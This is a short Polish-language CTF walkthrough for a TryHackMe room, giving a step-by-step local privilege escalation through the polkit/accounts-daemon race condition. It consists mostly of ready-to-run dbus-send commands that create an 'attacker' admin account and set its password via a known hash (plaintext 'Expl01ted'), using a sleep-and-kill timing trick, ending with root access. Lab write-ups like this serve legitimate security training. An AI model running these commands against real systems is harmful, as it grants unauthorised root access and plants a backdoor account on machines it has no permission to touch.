# Info
(https://tryhackme.com/room/hipflask)(Task 19)

# Step 1
1. Mierzymy czas jaki zajmie wyslanie wiadomosci do demona kont:
```console
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
```
          
          [output]
          real    0m0.015s
          user    0m0.002s
          sys     0m0.000s

# Step 2
2. Interesuje nas 'real' 
Teraz musimy pobrać ten sam komunikat dbus, wysłać go, a następnie odciąć mniej więcej w połowie wykonywania
```console
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```
        
W komendzie napisalismy 'sleep 0.005s' tyle dziala na exploitowanej maszynie, normalnie trzeba probowac rozne wartosci.
Komenda dodaje uzytkownika 'attacker' wiec wykonujemy komende i piszemy 'id attacker' jak nie ma to zmieniamy opoznienie i jeszcze raz.

# Step 3 
[Nadanie chasla]
Teraz musimy nadac haslo nowemu uzytkownikowi. Uzywamy dokladnie tej samej techniki tylko inny komunikat wysylamy do demona kont.
```console
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
```   
 Komenda ustawi haslo na : Expl01ted

 # Step 4
 4. No i jak wszystko gra to sie logujemy i mamy roota :)
